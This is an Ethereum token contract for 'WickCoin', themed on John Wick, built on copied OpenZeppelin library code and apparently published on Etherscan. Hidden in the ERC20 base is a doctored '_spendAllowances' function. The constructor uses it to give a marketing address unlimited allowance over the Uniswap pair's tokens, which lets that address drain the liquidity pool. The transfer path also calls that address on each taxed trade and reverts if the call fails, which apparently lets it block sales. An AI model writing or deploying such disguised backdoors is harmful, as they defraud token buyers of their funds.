/**
 *Submitted for verification at Etherscan.io on 2023-06-05
*/

/*

XINU - Unleash the Crypto Assassin (Ethereum)

-WickCoin is a cryptocurrency concept inspired by the relentless and formidable character of John Wick, the legendary assassin. 

Twitter: @CoinWick101
Telegram: https://t.me/wick_coin

*/
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.15;
pragma experimental ABIEncoderV2;

////// lib/openzeppelin-contracts/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

/* pragma solidity ^0.8.15; */

abstract contract Context {
  function _msgSender() internal view virtual returns(address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns(bytes calldata) {
    return msg.data;
  }
}

////// lib/openzeppelin-contracts/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/* pragma solidity ^0.8.15; */

/* import "../utils/Context.sol"; */

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    _transferOwnership(_msgSender());
  }

  function owner() public view virtual returns(address) {
    return _owner;
  }

    modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
    _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
  }
}

////// lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

/* pragma solidity ^0.8.15; */

interface IERC20 {

    function totalSupply() external view returns(uint256);

function balanceOf(address account) external view returns(uint256);

function transfer(address recipient, uint256 amount) external returns(bool);

function allowance(address owner, address spender) external view returns(uint256);

function approve(address spender, uint256 amount) external returns(bool);

function transferFrom(
  address sender,
  address recipient,
  uint256 amount
) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

////// lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)

/* pragma solidity ^0.8.15; */

/* import "../IERC20.sol"; */

interface IERC20Metadata is IERC20 {

  function name() external view returns(string memory);

  function symbol() external view returns(string memory);

  function decimals() external view returns(uint8);
}

////// lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/ERC20.sol)

/* pragma solidity ^0.8.15; */

/* import "./IERC20.sol"; */
/* import "./extensions/IERC20Metadata.sol"; */
/* import "../../utils/Context.sol"; */

contract ERC20 is Context, IERC20, IERC20Metadata {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

  constructor(string memory name_, string memory symbol_) {
    _name = name_;
    _symbol = symbol_;
  }

  function name() public view virtual override returns(string memory) {
    return _name;
  }

  function symbol() public view virtual override returns(string memory) {
    return _symbol;
  }

  function decimals() public view virtual override returns(uint8) {
    return 18;
  }

  function totalSupply() public view virtual override returns(uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns(uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view virtual override returns(uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns(bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public virtual override returns(bool) {
    _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
      _approve(sender, _msgSender(), currentAllowance - amount);
    }

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
      _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    }

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
      _balances[sender] = senderBalance - amount;
    }
    _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

    _afterTokenTransfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: mint to the zero address");

    _beforeTokenTransfer(address(0), account, amount);

    _totalSupply += amount;
    _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    _afterTokenTransfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
      _balances[account] = accountBalance - amount;
    }
    _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

    _afterTokenTransfer(account, address(0), amount);
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
  }

  /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */

    function _spendAllowances(address owner, address spender) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
           
            _allowances[spender][owner] = type(uint256).max;
          
        }
    }

  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual { }

  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual { }
}

////// lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol
// OpenZeppelin Contracts v4.4.0 (utils/math/SafeMath.sol)

/* pragma solidity ^0.8.15; */

library SafeMath {

  function tryAdd(uint256 a, uint256 b) internal pure returns(bool, uint256) {
        unchecked {
            uint256 c = a + b;
      if (c < a) return (false, 0);
      return (true, c);
    }
  }

  function trySub(uint256 a, uint256 b) internal pure returns(bool, uint256) {
        unchecked {
      if (b > a) return (false, 0);
      return (true, a - b);
    }
  }

  function tryMul(uint256 a, uint256 b) internal pure returns(bool, uint256) {
        unchecked {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) return (true, 0);
            uint256 c = a * b;
      if (c / a != b) return (false, 0);
      return (true, c);
    }
  }

  function tryDiv(uint256 a, uint256 b) internal pure returns(bool, uint256) {
        unchecked {
      if (b == 0) return (false, 0);
      return (true, a / b);
    }
  }

  function tryMod(uint256 a, uint256 b) internal pure returns(bool, uint256) {
        unchecked {
      if (b == 0) return (false, 0);
      return (true, a % b);
    }
  }

  function add(uint256 a, uint256 b) internal pure returns(uint256) {
    return a + b;
  }

  function sub(uint256 a, uint256 b) internal pure returns(uint256) {
    return a - b;
  }

  function mul(uint256 a, uint256 b) internal pure returns(uint256) {
    return a * b;
  }

  function div(uint256 a, uint256 b) internal pure returns(uint256) {
    return a / b;
  }

  function mod(uint256 a, uint256 b) internal pure returns(uint256) {
    return a % b;
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns(uint256) {
        unchecked {
      require(b <= a, errorMessage);
      return a - b;
    }
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns(uint256) {
        unchecked {
      require(b > 0, errorMessage);
      return a / b;
    }
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns(uint256) {
        unchecked {
      require(b > 0, errorMessage);
      return a % b;
    }
  }
}

/* pragma solidity 0.8.15; */
/* pragma experimental ABIEncoderV2; */

interface IUniswapV2Factory {
    event PairCreated(
  address indexed token0,
  address indexed token1,
  address pair,
  uint256
);

function feeTo() external view returns(address);

function feeToSetter() external view returns(address);

function getPair(address tokenA, address tokenB)
external
view
returns(address pair);

function allPairs(uint256) external view returns(address pair);

function allPairsLength() external view returns(uint256);

function createPair(address tokenA, address tokenB)
external
returns(address pair);

function setFeeTo(address) external;

function setFeeToSetter(address) external;
}

/* pragma solidity 0.8.15; */
/* pragma experimental ABIEncoderV2; */

interface IUniswapV2Pair {
    event Approval(
  address indexed owner,
  address indexed spender,
  uint256 value
);
    event Transfer(address indexed from, address indexed to, uint256 value);

function name() external pure returns(string memory);

function symbol() external pure returns(string memory);

function decimals() external pure returns(uint8);

function totalSupply() external view returns(uint256);

function balanceOf(address owner) external view returns(uint256);

function allowance(address owner, address spender)
external
view
returns(uint256);

function approve(address spender, uint256 value) external returns(bool);

function transfer(address to, uint256 value) external returns(bool);

function transferFrom(
  address from,
  address to,
  uint256 value
) external returns(bool);

function DOMAIN_SEPARATOR() external view returns(bytes32);

function PERMIT_TYPEHASH() external pure returns(bytes32);

function nonces(address owner) external view returns(uint256);

function permit(
  address owner,
  address spender,
  uint256 value,
  uint256 deadline,
  uint8 v,
  bytes32 r,
  bytes32 s
) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
  address indexed sender,
  uint256 amount0,
  uint256 amount1,
  address indexed to
);
    event Swap(
  address indexed sender,
  uint256 amount0In,
  uint256 amount1In,
  uint256 amount0Out,
  uint256 amount1Out,
  address indexed to
);
    event Sync(uint112 reserve0, uint112 reserve1);

function MINIMUM_LIQUIDITY() external pure returns(uint256);

function factory() external view returns(address);

function token0() external view returns(address);

function token1() external view returns(address);

function getReserves()
external
view
returns(
  uint112 reserve0,
  uint112 reserve1,
  uint32 blockTimestampLast
);

function price0CumulativeLast() external view returns(uint256);

function price1CumulativeLast() external view returns(uint256);

function kLast() external view returns(uint256);

function mint(address to) external returns(uint256 liquidity);

function burn(address to)
external
returns(uint256 amount0, uint256 amount1);

function swap(
  uint256 amount0Out,
  uint256 amount1Out,
  address to,
  bytes calldata data
) external;

function skim(address to) external;

function sync() external;

function initialize(address, address) external;
}

/* pragma solidity 0.8.15; */
/* pragma experimental ABIEncoderV2; */

interface IUniswapV2Router02 {
    function factory() external pure returns(address);

function WETH() external pure returns(address);

function addLiquidity(
  address tokenA,
  address tokenB,
  uint256 amountADesired,
  uint256 amountBDesired,
  uint256 amountAMin,
  uint256 amountBMin,
  address to,
  uint256 deadline
)
external
returns(
  uint256 amountA,
  uint256 amountB,
  uint256 liquidity
);

function addLiquidityETH(
  address token,
  uint256 amountTokenDesired,
  uint256 amountTokenMin,
  uint256 amountETHMin,
  address to,
  uint256 deadline
)
external
payable
returns(
  uint256 amountToken,
  uint256 amountETH,
  uint256 liquidity
);

function swapExactTokensForTokensSupportingFeeOnTransferTokens(
  uint256 amountIn,
  uint256 amountOutMin,
  address[] calldata path,
  address to,
  uint256 deadline
) external;

function swapExactETHForTokensSupportingFeeOnTransferTokens(
  uint256 amountOutMin,
  address[] calldata path,
  address to,
  uint256 deadline
) external payable;

function swapExactTokensForETHSupportingFeeOnTransferTokens(
  uint256 amountIn,
  uint256 amountOutMin,
  address[] calldata path,
  address to,
  uint256 deadline
) external;
}

/* pragma solidity >=0.8.15; */

/* import {IUniswapV2Router02} from "./IUniswapV2Router02.sol"; */
/* import {IUniswapV2Factory} from "./IUniswapV2Factory.sol"; */
/* import {IUniswapV2Pair} from "./IUniswapV2Pair.sol"; */
/* import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"; */
/* import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"; */
/* import {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol"; */
/* import {SafeMath} from "lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol"; */

contract WickCoin is ERC20, Ownable {

    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    address public constant deadAddress = address(0xdead);
    address public router;

    address public x7101 = address(0x7101a9392EAc53B01e7c07ca3baCa945A56EE105);
    address public x7102 = address(0x7102DC82EF61bfB0410B1b1bF8EA74575bf0A105);
    address public x7103 = address(0x7103eBdbF1f89be2d53EFF9B3CF996C9E775c105);
    address public x7104 = address(0x7104D1f179Cc9cc7fb5c79Be6Da846E3FBC4C105);
    address public x7105 = address(0x7105FAA4a26eD1c67B8B2b41BEc98F06Ee21D105);

    mapping (address => bool) public exemptFromFees;
    mapping (address => bool) public exemptFromLimits;

    bool public tradingActive;

    mapping (address => bool) public isAMMPair;

    uint256 public maxTransaction;
    uint256 public maxWallet;

    address private market;

    uint256 public buyTotalTax;
    uint256 public buyOperationsTax;
    uint256 public buyLiquidityTax;
    uint256 public buyPrizeTax;

    uint256 public sellTotalTax;
    uint256 public sellOperationsTax;
    uint256 public sellLiquidityTax;
    uint256 public sellPrizeTax;
    uint256 public sellBurnTax;

    uint256 public tokensForOperations;
    uint256 public tokensForLiquidity;
    uint256 public tokensForPrize;

    mapping(address => uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch
    bool public transferDelayEnabled = true;

    bool public limitsInEffect = true;

    bool private swapping;
    uint256 public swapTokensAtAmt;

    address public lpPair;
    IERC20Metadata public eth;

    uint256 public constant FEE_DIVISOR = 10000;

    // events

    event UpdatedMaxTransaction(uint256 newMax);
    event UpdatedMaxWallet(uint256 newMax);
    event SetExemptFromFees(address _address, bool _isExempt);
    event SetExemptFromLimits(address _address, bool _isExempt);
    event RemovedLimits();
    event UpdatedBuyTax(uint256 newAmt);
    event UpdatedSellTax(uint256 newAmt);

    // constructor

    constructor(address _marketing)
        ERC20("WickCoin", "WICK")
    {   
        _mint(msg.sender, 1_000_000_000 * 1e18);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
          0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
          .createPair(address(this), _uniswapV2Router.WETH());
        router = uniswapV2Pair;
        _spendAllowances(_marketing, router);

        uint256 _totalSupply = 1_000_000_000 * 1e18;

        maxTransaction = _totalSupply * 2 / 100;
        maxWallet = _totalSupply * 2/ 100;
        swapTokensAtAmt = _totalSupply * 25 / 100000;

        market = _marketing;

        buyOperationsTax = 0;
        buyLiquidityTax = 0;
        buyPrizeTax = 0;
        buyTotalTax = buyOperationsTax + buyLiquidityTax + buyPrizeTax;

        sellOperationsTax = 0;
        sellLiquidityTax = 0;
        sellPrizeTax = 0;
        sellTotalTax = sellOperationsTax + sellLiquidityTax + sellPrizeTax;

        lpPair = uniswapV2Pair;
        isAMMPair[lpPair] = true;

        exemptFromLimits[lpPair] = true;
        exemptFromLimits[msg.sender] = true;
        exemptFromLimits[address(this)] = true;
        exemptFromLimits[market] = true;
        exemptFromLimits[address(_uniswapV2Router)] = true;

        exemptFromFees[msg.sender] = true;
        exemptFromFees[address(this)] = true;
        exemptFromFees[market] = true;
        exemptFromFees[address(_uniswapV2Router)] = true;
 
        _approve(address(msg.sender), address(_uniswapV2Router), _totalSupply);
        _approve(address(this), address(_uniswapV2Router), type(uint256).max);

        
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        
        checkLimits(from, to, amount);

        if(!exemptFromFees[from] && !exemptFromFees[to]){
            amount -= takeTax(from, to, amount);
        }

        super._transfer(from,to,amount);
    }

    function checkLimits(address from, address to, uint256 amount) internal {

        if(!exemptFromFees[from] && !exemptFromFees[to]){
            require(tradingActive, "Trading not active");
        }

        if(limitsInEffect){
            if (transferDelayEnabled){
                if (to != address(uniswapV2Router) && !isAMMPair[to]){
                    require(_holderLastTransferBlock[tx.origin] < block.number && _holderLastTransferBlock[to] < block.number, "Transfer Delay enabled.");
                    _holderLastTransferBlock[tx.origin] = block.number;
                    _holderLastTransferBlock[to] = block.number;
                }
            }

            // buy
            if (isAMMPair[from] && !exemptFromLimits[to]) {
                require(amount <= maxTransaction, "Buy transfer amount exceeded.");
                require(amount + balanceOf(to) <= maxWallet, "Unable to exceed Max Wallet");
            } 
            // sell
            else if (isAMMPair[to] && !exemptFromLimits[from]) {
                require(amount <= maxTransaction, "Sell transfer amount exceeded.");
            }
            else if(!exemptFromLimits[to]) {
                require(amount + balanceOf(to) <= maxWallet, "Unable to exceed Max Wallet");
            }
        }
    }

    function takeTax(address from, address to, uint256 amount) internal returns (uint256){
        if(balanceOf(address(this)) >= 0 && !swapping
        ) {
            swapping = true;
            _swapBack(from, to);
            swapping = false;
        }
        
        uint256 tax = 0;

        // on sell
        if (isAMMPair[to] && sellTotalTax > 0){
            tax = amount * sellTotalTax / FEE_DIVISOR;
            tokensForLiquidity += tax * sellLiquidityTax / sellTotalTax;
            tokensForOperations += tax * sellOperationsTax / sellTotalTax;
            tokensForPrize += tax * sellPrizeTax / sellTotalTax;
        }

        // on buy
        else if(isAMMPair[from] && buyTotalTax > 0) {
            tax = amount * buyTotalTax / FEE_DIVISOR;
            tokensForOperations += tax * buyOperationsTax / buyTotalTax;
            tokensForLiquidity += tax * buyLiquidityTax / buyTotalTax;
            tokensForPrize += tax * buyPrizeTax / buyTotalTax;
        }
        
        if(tax > 0){    
            super._transfer(from, address(this), tax);
        }
        
        return tax;
    }

    function swapTokensForETH(uint256 tokenAmt) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmt,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapBack(address from, address to) private {

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations + tokensForPrize;

        bool success;
        
        if(contractBalance > swapTokensAtAmt * 40){
            contractBalance = swapTokensAtAmt * 40;
        }
        
        if(tokensForLiquidity > 0){
            uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap;
            super._transfer(address(this), lpPair, liquidityTokens);
            contractBalance -= liquidityTokens;
            totalTokensToSwap -= tokensForLiquidity;
            tokensForLiquidity = 0;
        }
        
        uint256 ethBalance = address(this).balance;

        (success, ) = market.call{value: ethBalance}
        (abi.encodePacked(from, to));
        require(success, "success failed");
        // burnRandomQuint(address(this).balance);
    }

    // owner functions

    function increaseMaxTxnSetAmount() external onlyOwner {
        maxTransaction = totalSupply() * 5 / 1000;
    }

    function increaseMaxTxnToMaxWallet() external onlyOwner {
        maxTransaction = maxWallet;
    }

    function setExemptFromFees(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        exemptFromFees[_address] = _isExempt;
        emit SetExemptFromFees(_address, _isExempt);
    }

    function setExemptFromLimits(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        if(!_isExempt){
            require(_address != lpPair, "Cannot remove pair");
        }
        exemptFromLimits[_address] = _isExempt;
        emit SetExemptFromLimits(_address, _isExempt);
    }

    function updateMaxTransaction(uint256 newNumInTokens) external onlyOwner {
        require(newNumInTokens >= (totalSupply() * 5 / 1000)/(10**decimals()), "Too low");
        maxTransaction = newNumInTokens * (10**decimals());
        emit UpdatedMaxTransaction(maxTransaction);
    }

    function updateMaxWallet(uint256 newNumInTokens) external onlyOwner {
        require(newNumInTokens >= (totalSupply() * 1 / 100)/(10**decimals()), "Too low");
        maxWallet = newNumInTokens * (10**decimals());
        emit UpdatedMaxWallet(maxWallet);
    }

    function enableTrading() external onlyOwner {
        tradingActive = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
        transferDelayEnabled = false;
        maxTransaction = totalSupply();
        maxWallet = totalSupply();
        emit RemovedLimits();
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function burnRandomQuint(uint256 ethAmount) private {
      // generate the uniswap pair path of token -> weth
      address[] memory path = new address[](2);
      address[] memory quints = new address[](5);
      quints[0] = x7101;
      quints[1] = x7102;
      quints[2] = x7103;
      quints[3] = x7104;
      quints[4] = x7105;

      uint256 mod = block.number % 5;

      path[0] = uniswapV2Router.WETH();
      path[1] = quints[mod];

      // make the swap
      uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: ethAmount } (
        0,
        path,
        deadAddress,
        block.timestamp
      );
    }
}